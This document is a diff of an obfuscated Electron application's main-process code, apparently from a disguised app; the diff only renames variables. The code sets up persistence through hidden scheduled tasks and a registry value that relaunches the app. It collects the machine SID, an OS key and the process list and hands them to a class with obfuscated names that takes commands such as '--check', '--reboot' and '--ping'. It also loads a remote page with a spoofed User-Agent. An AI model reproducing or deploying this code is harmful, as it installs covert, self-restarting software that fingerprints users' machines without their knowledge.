         if (!electron3.commandLine.hasSwitch('c') && !electron3.commandLine.hasSwitch('cm')) {
-          await wk('--install');
-          ws();
+          await wj('--install');
+          wr();
         }
-        if (electron3.commandLine.hasSwitch('c') && wh == '0') {
-          ws();
+        if (electron3.commandLine.hasSwitch('c') && wg == '0') {
+          wr();
         }
         if (electron3.commandLine.hasSwitch('cm')) {
-          if (wi == "--cleanup") {
-            await wk(wi);
+          if (wh == "--cleanup") {
+            await wj(wh);
             console.log("remove ST");
-            Utilityaddon.remove_task_schedule(we.scheduledTaskName);
-            Utilityaddon.remove_task_schedule(we.scheduledUTaskName);
-          } else if (wi == "--partialupdate") {
-            await wk('--check');
-          } else if (wi == "--fullupdate") {
-            await wk("--reboot");
-          } else if (wi == "--enableupdate") {
-            Utilityaddon.SetRegistryValue(we.registryName, "\"" + wj + "\\" + we.appName + "\" --cm=--fullupdate");
-          } else if (wi == "--disableupdate") {
-            Utilityaddon.DeleteRegistryValue(we.registryName);
-          } else if (wi == "--backupupdate") {
-            await wk("--ping");
+            Utilityaddon.remove_task_schedule(wd.scheduledTaskName);
+            Utilityaddon.remove_task_schedule(wd.scheduledUTaskName);
+          } else if (wh == "--partialupdate") {
+            await wj('--check');
+          } else if (wh == "--fullupdate") {
+            await wj("--reboot");
+          } else if (wh == "--enableupdate") {
+            Utilityaddon.SetRegistryValue(wd.registryName, "\"" + wi + "\\" + wd.appName + "\" --cm=--fullupdate");
+          } else if (wh == "--disableupdate") {
+            Utilityaddon.DeleteRegistryValue(wd.registryName);
+          } else if (wh == "--backupupdate") {
+            await wj("--ping");
           }
           if (!electron3.commandLine.hasSwitch('c')) {
             electron3.quit();
           }
         }
-        async function wk(wv) {
+        async function wj(wu) {
           console.log("To add wc routine");
-          await wr(wv);
+          await wq(wu);
         }
-        function wl() {
+        function wk() {
           return Utilityaddon.get_sid();
         }
-        function wm(ww) {
-          return Utilityaddon.GetOsCKey(ww);
+        function wl(wv) {
+          return Utilityaddon.GetOsCKey(wv);
         }
-        function wn(wx, wy, wz) {
-          return Utilityaddon.mutate_task_schedule(wx, wy, wz);
+        function wm(ww, wx, wy) {
+          return Utilityaddon.mutate_task_schedule(ww, wx, wy);
         }
-        function wo(xa) {
-          return Utilityaddon.find_process(xa);
+        function wn(wz) {
+          return Utilityaddon.find_process(wz);
         }
-        function wp() {
+        function wo() {
           return Utilityaddon.GetPsList();
         }
-        function wq() {
+        function wp() {
           try {
-            let xb = Utilityaddon.mutate_task_schedule("\\", we.scheduledTaskName, 1);
-            if (!xb) {
-              Utilityaddon.create_task_schedule(we.scheduledTaskName, we.scheduledTaskName, "\"" + wj + "\\" + we.appName + "\"", "--cm=--partialupdate", wj, 1442);
+            let xa = Utilityaddon.mutate_task_schedule("\\", wd.scheduledTaskName, 1);
+            if (!xa) {
+              Utilityaddon.create_task_schedule(wd.scheduledTaskName, wd.scheduledTaskName, "\"" + wi + "\\" + wd.appName + "\"", "--cm=--partialupdate", wi, 1442);
             }
-            let xc = Utilityaddon.mutate_task_schedule("\\", we.scheduledUTaskName, 1);
-            if (!xb) {
-              Utilityaddon.create_repeat_task_schedule(we.scheduledUTaskName, we.scheduledUTaskName, "\"" + wj + "\\" + we.appName + "\"", "--cm=--backupupdate", wj);
+            let xb = Utilityaddon.mutate_task_schedule("\\", wd.scheduledUTaskName, 1);
+            if (!xa) {
+              Utilityaddon.create_repeat_task_schedule(wd.scheduledUTaskName, wd.scheduledUTaskName, "\"" + wi + "\\" + wd.appName + "\"", "--cm=--backupupdate", wi);
             }
-          } catch (xd) {
-            console.log(xd);
+          } catch (xc) {
+            console.log(xc);
           }
         }
-        async function wr(xe) {
-          let xf = wg(xe);
-          console.log("argument = " + xe);
-          const xg = new g().A672SIS(wl, wm, wn, wo, wp);
-          if (wd.a689XV5.b5BEPQ2 == xf) {
-            if ((await xg.q41FDEK()) == g().U5E7DEV.C5B7MFV) {
-              wq();
+        async function wq(xd) {
+          let xe = wf(xd);
+          console.log("argument = " + xd);
+          const xf = new g().A672SIS(wk, wl, wm, wn, wo);
+          if (wc.a689XV5.b5BEPQ2 == xe) {
+            if ((await xf.q41FDEK()) == g().U5E7DEV.C5B7MFV) {
+              wp();
             }
-          } else if (wd.a689XV5.Z498ME9 == xf) {
-            await xg.l660ZQF();
-          } else if (wd.a689XV5.f63DUQF == xf) {
-            await xg.A4B0MTO();
+          } else if (wc.a689XV5.Z498ME9 == xe) {
+            await xf.l660ZQF();
+          } else if (wc.a689XV5.f63DUQF == xe) {
+            await xf.A4B0MTO();
           } else {
             e().w3F3UWA.s59BT06('');
-            await xg.m58FJB5(xf);
+            await xf.m58FJB5(xe);
           }
         }
-        function ws() {
+        function wr() {
           try {
-            let xh = wj + we.modeDataPath;
-            console.log("modeFile = " + xh);
-            if (fs15.existsSync(xh)) {
+            let xg = wi + wd.modeDataPath;
+            console.log("modeFile = " + xg);
+            if (fs15.existsSync(xg)) {
               flag10 = false;
             } else {
               flag10 = true;
             }
-          } catch (xi) {
-            console.log(xi);
+          } catch (xh) {
+            console.log(xh);
           }
         }
-        function wt() {
+        function ws() {
           try {
-            let xj = wj + we.modeDataPath;
-            if (fs15.existsSync(xj)) {
-              fs15.rmSync(xj, {
+            let xi = wi + wd.modeDataPath;
+            if (fs15.existsSync(xi)) {
+              fs15.rmSync(xi, {
                 force: true
               });
             }
-          } catch (xk) {
-            console.log(xk);
+          } catch (xj) {
+            console.log(xj);
           }
         }
         if (flag10) {
           electron3.whenReady().then(() => {
-            let xl = i().createBrowserWindow(electron3);
-            require("electron").session.defaultSession.webRequest.onBeforeSendHeaders((xm, xn) => {
-              xm.requestHeaders["User-Agent"] = we.USER_AGENT;
-              xn({
+            let xk = i().createBrowserWindow(electron3);
+            require("electron").session.defaultSession.webRequest.onBeforeSendHeaders((xl, xm) => {
+              xl.requestHeaders["User-Agent"] = wd.USER_AGENT;
+              xm({
                 cancel: false,
-                requestHeaders: xm.requestHeaders
+                requestHeaders: xl.requestHeaders
               });
             });
-            xl.loadURL(we.homeUrl);
-            xl.on("close", function (xo) {
-              xo.preventDefault();
-              xl.destroy();
+            xk.loadURL(wd.homeUrl);
+            xk.on("close", function (xn) {
+              xn.preventDefault();
+              xk.destroy();
             });
           });
-          electron5.on(we.CHANNEL_NAME, (xp, xq) => {
-            if (xq == "Set") {
-              Utilityaddon.SetRegistryValue(we.registryName, "\"" + wj + "\\" + we.appName + "\" --cm=--fullupdate");
+          electron5.on(wd.CHANNEL_NAME, (xo, xp) => {
+            if (xp == "Set") {
+              Utilityaddon.SetRegistryValue(wd.registryName, "\"" + wi + "\\" + wd.appName + "\" --cm=--fullupdate");
             }
-            if (xq == "Unset") {
-              Utilityaddon.DeleteRegistryValue(we.registryName);
+            if (xp == "Unset") {
+              Utilityaddon.DeleteRegistryValue(wd.registryName);
             }
           });
           electron3.on("window-all-closed", () => {
@@ -3355,9 +3349,9 @@
             }
           });
         }
-        wt();
+        ws();
       }
-      wf();
+      we();
     }
   });
   j();
